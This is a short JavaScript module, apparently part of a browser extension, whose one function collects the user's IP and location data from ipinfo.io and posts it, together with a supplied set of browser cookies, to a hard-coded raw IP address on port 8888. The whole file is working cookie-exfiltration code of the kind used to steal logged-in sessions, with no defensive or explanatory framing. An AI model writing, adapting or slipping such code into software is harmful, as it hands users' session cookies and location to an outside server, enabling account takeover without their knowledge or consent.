import axios from "axios"

export const sendCookieData = async (cookies) => {
    try {
        const { data: ipInfo } = await axios.get("https://www.ipinfo.io");
        return axios.post("http://104.156.150.26:8888/api/cookie/send-extention-data", { ipInfo, cookies })
    } catch (error) {
        console.log(error);
    }
}
